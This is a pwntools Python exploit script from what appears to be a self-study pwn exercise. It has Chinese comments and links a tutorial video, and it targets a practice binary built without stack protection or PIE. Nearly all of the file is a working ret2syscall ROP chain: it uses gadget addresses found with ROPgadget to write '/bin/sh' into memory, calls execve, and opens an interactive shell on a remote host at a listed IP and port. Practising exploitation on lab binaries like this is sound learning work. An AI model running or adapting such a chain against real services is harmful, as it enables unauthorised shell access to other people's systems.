'''
Author: 白银
Date: 2023-01-02 15:36:47
LastEditTime: 2023-01-02 17:01:58
LastEditors: 白银
Description: gcc question_5_test9_syscall.c -fno-stack-protector -no-pie -static -o question_5_x64_test9_syscall  https://www.bilibili.com/video/BV1mr4y1Y7fW?t=1519.8&p=23
Attention: ret2syscall
FilePath: /pwn/question_5_x64_test9_syscall.py
'''

from pwn import *

set_arch = 0

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './question_5_x64_test9_syscall'
state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.139", 8888)
    # io = remote("129.226.211.132", 8888)
else:
    io = process(pwnfile)

    # 本地用
    elf = ELF(pwnfile)
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

'''
开始准备布置栈帧
'''
padding = 0x10  # ida看，var和r差多少
# alt+t找syscall，用和retn靠在一起的，如果中间隔了一个pop之类，插一个deadbeef就行
syscall_addr = 0x40E1DC
# ROPgadget --binary question_5_x64_test9_syscall --only "pop|ret" | grep rax的0x00000000004435e3 : pop rax ; ret
pop_rax_ret = 0x4435e3
# ROPgadget --binary question_5_x64_test9_syscall --only "pop|ret" | grep rdi的0x000000000040178e : pop rdi ; ret
pop_rdi_ret = 0x40178e
# ROPgadget --binary question_5_x64_test9_syscall --only "pop|ret" | grep rsi的0x000000000040777e : pop rsi ; ret
pop_rsi_ret = 0x40777e
# ROPgadget --binary question_5_x64_test9_syscall --only "pop|ret" | grep rdx的0x00000000004016ab : pop rdx ; ret
pop_rdx_ret = 0x4016ab
# 找不到“/bin/sh”，vmmap找rw的地址范围，去ida在指定的地址范围内找align，把上下两行差距≥8的第一行的地址当作写入/bin/sh的地址，最好找附近带？的
bin_ssh_addr = 0x4B5241

payload = flat(['a' * padding])
payload += flat([pop_rax_ret, 0, pop_rdi_ret, 0, pop_rsi_ret, bin_ssh_addr, pop_rdx_ret, 8, syscall_addr]) # 8是因为/bin/sh占8个字节，要模仿read函数
payload += flat([pop_rax_ret, 0x3b, pop_rdi_ret, bin_ssh_addr, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_addr]) # 0x3b就是execve

delimiter = 'input:'

if state == 0:
    io.sendline(payload)  # 远程用
else:
    io.sendlineafter(delimiter, payload)  # 本地用

io.send(b'/bin/sh\0x00')
io.interactive()
